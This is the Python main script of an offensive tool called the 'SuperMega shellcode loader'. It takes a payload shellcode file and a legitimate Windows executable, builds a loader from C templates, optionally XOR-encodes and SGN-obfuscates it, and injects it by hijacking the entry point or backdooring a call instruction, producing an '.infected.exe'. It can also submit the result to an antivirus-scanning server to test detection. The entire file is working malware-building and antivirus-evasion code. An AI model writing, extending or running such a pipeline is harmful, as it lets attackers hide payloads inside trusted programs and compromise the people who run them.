import shutil
import argparse
from typing import Dict
import os
import logging
import time

from helper import *
from config import config
import phases.templater
import phases.compiler
import phases.assembler
import phases.injector
from observer import observer
from pe.pehelper import extract_code_from_exe_file_ep
from sender import scannerDetectsBytes
from model.project import Project, prepare_project
from model.settings import Settings
from model.defs import *
from log import setup_logging


def main():
    """Argument parsing for when called from command line"""
    logger.info("Super Mega")
    config.load()
    settings = Settings()

    parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
    parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
    parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
    parser.add_argument('--function_invoke_style', type=str, help='peb_walk or iat_reuse')
    parser.add_argument('--decoder', type=str, help='Template: which decoder plugin')
    parser.add_argument('--carrier_invoke', type=str, help='Redbackdoorer run argument (1 EAP, 2 hijack)')
    parser.add_argument('--start-injected', action='store_true', help='Dev: Start the generated infected executable at the end')
    parser.add_argument('--start-loader-shellcode', action='store_true', help='Dev: Start the loader shellcode (without payload)')
    parser.add_argument('--start-final-shellcode', action='store_true', help='Debug: Start the final shellcode (loader + payload)')
    parser.add_argument('--short-call-patching', action='store_true', help='Make short calls long. You will know when you need it.')
    parser.add_argument('--no-clean-at-start', action='store_true', help='Debug: Dont remove any temporary files at start')
    parser.add_argument('--no-clean-at-exit', action='store_true', help='Debug: Dont remove any temporary files at exit')
    parser.add_argument('--show', action='store_true', help='Debug: Show tool output')
    args = parser.parse_args()

    if args.show:
        config.ShowCommandOutput = True

    settings.try_start_final_infected_exe = args.start_injected
    settings.cleanup_files_on_start = not args.no_clean_at_start
    settings.cleanup_files_on_exit =not args.no_clean_at_exit

    if args.short_call_patching:
        settings.short_call_patching = True

    if args.function_invoke_style:
        if args.function_invoke_style == "peb_walk":
            settings.source_style = FunctionInvokeStyle.peb_walk
        elif args.function_invoke_style == "iat_reuse":
            settings.source_style = FunctionInvokeStyle.iat_reuse
    if args.decoder:
        if args.decoder == "plain_1":
            settings.decoder_style = DecoderStyle.PLAIN_1
        elif args.decoder == "xor_1":
            settings.decoder_style = DecoderStyle.XOR_1
    if args.inject:
        if args.carrier_invoke == "eop":
            settings.carrier_invoke_style = CarrierInvokeStyle.ChangeEntryPoint
        elif args.carrier_invoke == "backdoor":
            settings.carrier_invoke_style = CarrierInvokeStyle.BackdoorCallInstr
        else:
            logging.error("Invalid mode, use one of:")
            for i in ["eop", "backdoor"]:
                logging.error("  {}  {}".format(i, carrier_invoke_style_str(i)))
            return

    if not args.shellcode or not args.inject:
        logger.error("Require: --shellcode <shellcode file> --inject <injectable.exe>")
        logger.info(r"Example: .\supermega.py --shellcode .\data\shellcodes\calc64.bin --inject .\data\exes\7z.exe")
        return 1
    if args.shellcode:
        if not os.path.isfile(args.shellcode):
            logger.info("Could not find: {}".format(args.shellcode))
            return
        settings.payload_path = args.shellcode
    if args.inject:
        if not os.path.isfile(args.inject):
            logger.info("Could not find: {}".format(args.inject))
            return
        settings.inject_exe_in = args.inject
        settings.inject_exe_out = args.inject.replace(".exe", ".infected.exe")

    settings.prep_web("default")
    write_webproject("default", settings)
    exit_code = start(settings)
    exit(exit_code)


def start(settings: Settings) -> int:
    """Main entry point for the application. Will handle log files and cleanup"""

    # Delete: all old files
    clean_tmp_files()
    if settings.cleanup_files_on_start:
        clean_files(settings)
        
    # And logs
    observer.reset()

    # Prepare the project: copy all files to projects/<project_name>/
    prepare_project("default", settings)

    # Do the thing and catch the errors
    try:
        start_real(settings)
    except Exception as e:
        logger.error(f'Error compiling: {e}')
        observer.write_logs(settings.main_dir)
        return 1
    
    # Cleanup files
    clean_tmp_files()
    if settings.cleanup_files_on_exit:
        clean_files(settings)

    # Write logs (on success)
    observer.write_logs(settings.main_dir)
    return 0


def start_real(settings: Settings):
    """Main entry point for the application. This is where the magic happens, based on settings"""

    # Load our input
    project = Project(settings)
    project.init()

    logger.warning("--I FunctionInvokeStyle: {}  Inject Mode: {}  DecoderStyle: {}".format(
        project.settings.source_style.value, 
        project.settings.carrier_invoke_style.value,
        project.settings.decoder_style.value))

    # Create: Carrier C source files from template (C->C)
    phases.templater.create_c_from_template(settings, project.payload.len)

    # Compile: Carrier to .asm (C -> ASM)
    if settings.generate_asm_from_c:
        phases.compiler.compile(
            c_in = settings.main_c_path, 
            asm_out = settings.main_asm_path, 
            payload_len = project.payload.len,
            carrier = project.carrier,
            source_style = project.settings.source_style,
            exe_host = project.exe_host,
            short_call_patching = project.settings.short_call_patching)

    # Assemble: Assemble .asm to .shc (ASM -> SHC)
    if settings.generate_shc_from_asm:
        phases.assembler.asm_to_shellcode(
            asm_in = settings.main_asm_path, 
            build_exe = settings.main_exe_path, 
            shellcode_out = settings.main_shc_path)
    
    # Merge: shellcode/loader with payload (SHC + PAYLOAD -> SHC)
    if settings.dataref_style == DataRefStyle.APPEND:
        phases.assembler.merge_loader_payload(
            shellcode_in = settings.main_shc_path,
            shellcode_out = settings.main_shc_path,
            payload_data = project.payload.payload_data, 
            decoder_style = settings.decoder_style)

    # RWX Injection (optional): obfuscate loader+payload
    if project.exe_host.rwx_section != None:
        logger.info("--[ RWX section {} found. Will obfuscate loader+payload and inject into it".format(
            project.exe_host.rwx_section.Name.decode().rstrip('\x00')
        ))
        obfuscate_shc_loader(settings.main_shc_path, settings.main_shc_path + ".sgn")
        observer.add_code_file("payload_sgn", file_readall_binary(settings.main_shc_path + ".sgn"))
        shutil.move(settings.main_shc_path + ".sgn", settings.main_shc_path)

    # inject merged loader into an exe
    phases.injector.inject_exe(settings.main_shc_path, settings, project)
    observer.add_code_file("exe_final", extract_code_from_exe_file_ep(settings.inject_exe_out, 300))

    if config.get("avred_server") != "":
        if settings.verify or settings.try_start_final_infected_exe:
            filename = os.path.basename(settings.inject_exe_in)
            with open(settings.inject_exe_out, "rb") as f:
                data = f.read()
            scannerDetectsBytes(data, filename, useBrotli=True, verify=settings.verify)
    else:
        # Start/verify it at the end
        if settings.verify:
            logger.info("--[ Verify infected exe")
            payload_exit_code = phases.injector.verify_injected_exe(settings.inject_exe_out)
            logging.info("Payload exit code: {}".format(payload_exit_code))
            if payload_exit_code != 0:
                raise Exception("Payload exit code: {}".format(payload_exit_code))
        elif settings.try_start_final_infected_exe:
            run_exe(settings.inject_exe_out, dllfunc=settings.dllfunc)


def obfuscate_shc_loader(file_shc_in, file_shc_out):
    logger.info("--[ Obfuscate shellcode with SGN")
    run_process_checkret([
        config.get("path_sgn"),
        "--arch=64",
        "-i", "{}".format(file_shc_in),
        "-o", "{}".format(file_shc_out),
    ], check=True)
    if not os.path.isfile(file_shc_out):
        logger.info("Error")
        return
    else:
        logger.info("   > Success obfuscation")
        pass


def verify_shellcode(shc_name):
    logger.info("---[ Verify shellcode: {}".format(shc_name))

    # check if directory exists
    if not os.path.exists(os.path.dirname(VerifyFilename)):
        logger.info("Error, directory does not exist for: {}".format(VerifyFilename))
        return
    
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_process_checkret([
        config.get("path_runshc"),
        "{}".format(shc_name),
    ], check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Shellcode works (file was created)")
        os.remove(VerifyFilename)
        return True
    else:
        logger.error("---> Verify FAIL. Shellcode doesnt work (file was not created)")
        return False


if __name__ == "__main__":
    setup_logging()
    main()
